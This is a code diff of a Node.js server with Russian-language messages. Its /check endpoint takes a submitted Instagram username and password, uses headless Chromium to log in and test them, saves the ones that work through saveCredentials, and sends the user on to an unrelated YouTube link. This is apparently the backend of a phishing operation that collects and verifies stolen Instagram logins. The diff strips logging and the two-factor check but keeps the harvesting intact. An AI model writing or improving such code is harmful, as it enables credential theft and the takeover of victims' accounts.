@@ -13,16 +13,13 @@ function validateCredentials(username, password) {
     if (!username || !password) {
         return { valid: false, message: "Логин и пароль обязательны!" };
     }
-
     if (password.length < 6) {
         return { valid: false, message: "Пароль должен быть минимум 6 символов." };
     }
-
     const usernameRegex = /^[a-zA-Z0-9._]+$/;
     if (!usernameRegex.test(username)) {
         return { valid: false, message: "Логин должен содержать только буквы, цифры и точки/подчеркивания." };
     }
-
     return { valid: true };
 }
 
@@ -48,62 +45,38 @@ app.post("/check", async (request, reply) => {
     console.log(`Начинаем проверку логина для пользователя: ${username}`);
 
     const browser = await chromium.launch({ headless: true });
-    console.log(`на этапе headless`);
     const page = await browser.newPage();
-    console.log(`new page`);
 
     try {
         await page.goto("https://www.instagram.com/accounts/login/");
-        console.log("Загружена страница авторизации...");
-
         await page.waitForSelector("input[name='username']", { timeout: 5000 });
-        console.log("Элементы формы авторизации найдены");
-
         await page.fill("input[name='username']", username);
         await page.fill("input[name='password']", password);
         await page.click("button[type='submit']");
-        console.log("Кнопка 'Войти' нажата");
-
-        // Дополнительная задержка для проверки редиректа
         await page.waitForTimeout(5000);
 
-        // Проверка на наличие ошибок авторизации
-        const errorMessage = await page.locator("div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid").count();
+        const errorMessage = await page.locator("div.xkmlbd1").count();
         if (errorMessage > 0) {
-            console.log("Ошибка входа: неверные данные.");
             await browser.close();
             return reply.send({ error: true, message: "Неверный логин или пароль" });
         }
 
-        // Проверка на успешный редирект
         let loginSuccess = false;
         for (let i = 0; i < 10; i++) {
             await page.waitForTimeout(1000);
-            const currentUrl = page.url();
-            console.log("Текущий URL:", currentUrl);
-
-            if (currentUrl !== "https://www.instagram.com/accounts/login/") {
+            if (page.url() !== "https://www.instagram.com/accounts/login/") {
                 loginSuccess = true;
                 break;
             }
-
-            // Проверка на наличие других возможных ошибок (например, 2FA)
-            const twoFactorMessage = await page.locator("div[class*='two-factor']").count();
-            if (twoFactorMessage > 0) {
-                console.log("Необходима двухфакторная аутентификация.");
-                await browser.close();
-                return reply.send({ error: true, message: "Необходима двухфакторная аутентификация" });
-            }
         }
 
-        await browser.close();
-
         if (loginSuccess) {
-            console.log(`Пользователь ${username} успешно вошел в аккаунт.`);
             saveCredentials(username, password);
-            return reply.send({ error: false, message: "Успешный вход в Instagram", redirectUrl: "https://www.instagram.com/reel/DGZvsOutpww/?igsh=MWozYjZtbWhyeHZvaA==" });
+            const redirectUrl = "https://www.youtube.com/watch?v=fi5-Q84I-RU&list=RD35EiSTCF0DY&index=10";
+            await browser.close();
+            return reply.send({ error: false, message: "Успешный вход в Instagram", redirectUrl });
         } else {
-            console.log("Ошибка входа: URL не изменился.");
+            await browser.close();
             return reply.send({ error: true, message: "Неверный логин или пароль" });
         }
     } catch (error) {
@@ -114,11 +87,10 @@ app.post("/check", async (request, reply) => {
 });
 
 app.get("/", async (request, reply) => {
-    console.log("Новый GET-запрос на /");
     reply.send("Сервер работает!");
 });
 
-app.listen({ port: PORT, host: '0.0.0.0' }, (err, address) => {
+app.listen({ port: PORT, host: "0.0.0.0" }, (err, address) => {
     if (err) {
         console.error("Ошибка запуска сервера:", err);
         process.exit(1);
